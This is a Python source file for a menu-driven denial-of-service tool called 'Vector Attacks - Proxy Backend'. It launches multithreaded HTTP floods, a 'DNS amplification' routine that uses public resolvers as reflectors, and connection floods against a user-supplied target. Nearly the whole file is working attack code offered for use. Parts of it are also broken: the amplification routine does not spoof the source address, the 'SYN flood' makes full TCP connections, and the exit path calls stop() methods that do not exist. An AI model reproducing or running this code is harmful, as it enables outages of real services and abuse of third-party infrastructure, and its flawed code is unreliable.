import os
import sys
import socket
import threading
import argparse
import requests
from scapy.all import send
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSQR
import random

# Global variables
PROXY_LIST = []
THREADS = []
STOP_FLAG = False

# Proxy server class
class ProxyServer:
    def __init__(self, target_host, target_port, proxy_port):
        self.target_host = target_host
        self.target_port = target_port
        self.proxy_port = proxy_port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind(('', self.proxy_port))
        self.server.listen(5)
        print(f"Proxy server listening on port {self.proxy_port}")

    def handle_client(self, client_socket):
        global STOP_FLAG
        if STOP_FLAG:
            return

        request = client_socket.recv(4096)
        if not request:
            return

        # Modify request if needed (e.g., add headers)
        modified_request = self.modify_request(request)

        # Forward request to target
        target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        target_socket.connect((self.target_host, self.target_port))
        target_socket.send(modified_request)

        # Receive response from target
        target_response = target_socket.recv(4096)
        if not target_response:
            return

        # Modify response if needed (e.g., change content)
        modified_response = self.modify_response(target_response)

        # Send modified response to client
        client_socket.send(modified_response)

        client_socket.close()
        target_socket.close()

    def modify_request(self, request):
        # Add custom headers or modify request here
        return request

    def modify_response(self, response):
        # Modify response content here
        return response

    def run(self):
        while not STOP_FLAG:
            client_socket, addr = self.server.accept()
            client_thread = threading.Thread(target=self.handle_client, args=(client_socket,))
            client_thread.start()

# Proxy chain class
class ProxyChain:
    def __init__(self, proxy_list):
        self.proxy_list = proxy_list
        self.current_proxy = 0

    def get_next_proxy(self):
        if not self.proxy_list:
            return None

        proxy = self.proxy_list[self.current_proxy]
        self.current_proxy = (self.current_proxy + 1) % len(self.proxy_list)
        return proxy

# HTTP flood class
class HTTPFlood:
    def __init__(self, target_url, num_threads):
        self.target_url = target_url
        self.num_threads = num_threads
        self.headers = {
            'User-Agent': 'Mozilla/5.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        }

    def send_request(self):
        global STOP_FLAG
        while not STOP_FLAG:
            try:
                response = requests.get(self.target_url, headers=self.headers)
                if response.status_code == 200:
                    print(f"Request sent to {self.target_url}")
            except Exception as e:
                print(f"Error: {e}")

    def start(self):
        for _ in range(self.num_threads):
            thread = threading.Thread(target=self.send_request)
            thread.start()

# DNS amplification class
class DNSAmplification:
    def __init__(self, target_ip, reflector_list, num_threads):
        self.target_ip = target_ip
        self.reflector_list = reflector_list
        self.num_threads = num_threads

    def send_amplification(self):
        global STOP_FLAG
        while not STOP_FLAG:
            try:
                reflector = random.choice(self.reflector_list)
                send(IP(dst=reflector)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=self.target_ip)))
            except Exception as e:
                print(f"Error: {e}")

    def start(self):
        for _ in range(self.num_threads):
            thread = threading.Thread(target=self.send_amplification)
            thread.start()

# SYN flood class
class SYNFlood:
    def __init__(self, target_ip, target_port, num_threads):
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_threads = num_threads

    def send_syn(self):
        global STOP_FLAG
        while not STOP_FLAG:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((self.target_ip, self.target_port))
                s.close()
            except Exception as e:
                print(f"Error: {e}")

    def start(self):
        for _ in range(self.num_threads):
            thread = threading.Thread(target=self.send_syn)
            thread.start()

# Main menu function
def main_menu():
    print("""
Vector Attacks - Proxy Backend
============================
1. Start Proxy Server
2. Start HTTP Flood
3. Start DNS Amplification
4. Start SYN Flood
5. Load Proxy List
6. Exit
""")

    choice = input("Select an option: ")
    return choice

# Main function
def main():
    global STOP_FLAG
    proxy_server = None
    http_flood = None
    dns_amplification = None
    syn_flood = None

    while True:
        choice = main_menu()

        if choice == '1':
            if proxy_server:
                print("Proxy server is already running.")
                continue

            target_host = input("Enter target host: ")
            target_port = int(input("Enter target port: "))
            proxy_port = int(input("Enter proxy port: "))

            proxy_server = ProxyServer(target_host, target_port, proxy_port)
            proxy_thread = threading.Thread(target=proxy_server.run)
            proxy_thread.start()

        elif choice == '2':
            if http_flood:
                print("HTTP flood is already running.")
                continue

            target_url = input("Enter target URL: ")
            num_threads = int(input("Enter number of threads: "))

            http_flood = HTTPFlood(target_url, num_threads)
            http_flood.start()

        elif choice == '3':
            if dns_amplification:
                print("DNS amplification is already running.")
                continue

            target_ip = input("Enter target IP: ")
            num_threads = int(input("Enter number of threads: "))

            reflector_list = [
                "8.8.8.8",
                "8.8.4.4",
                "1.1.1.1",
                "1.0.0.1"
            ]

            dns_amplification = DNSAmplification(target_ip, reflector_list, num_threads)
            dns_amplification.start()

        elif choice == '4':
            if syn_flood:
                print("SYN flood is already running.")
                continue

            target_ip = input("Enter target IP: ")
            target_port = int(input("Enter target port: "))
            num_threads = int(input("Enter number of threads: "))

            syn_flood = SYNFlood(target_ip, target_port, num_threads)
            syn_flood.start()

        elif choice == '5':
            proxy_file = input("Enter proxy list file path: ")
            try:
                with open(proxy_file, 'r') as f:
                    global PROXY_LIST
                    PROXY_LIST = f.read().splitlines()
                    print(f"Loaded {len(PROXY_LIST)} proxies")
            except Exception as e:
                print(f"Error loading proxy list: {e}")

        elif choice == '6':
            print("Stopping all attacks...")
            STOP_FLAG = True
            if proxy_server:
                proxy_server.server.close()
            if http_flood:
                http_flood.stop()
            if dns_amplification:
                dns_amplification.stop()
            if syn_flood:
                syn_flood.stop()
            break

        else:
            print("Invalid option. Please try again.")

if __name__ == "__main__":
    main()
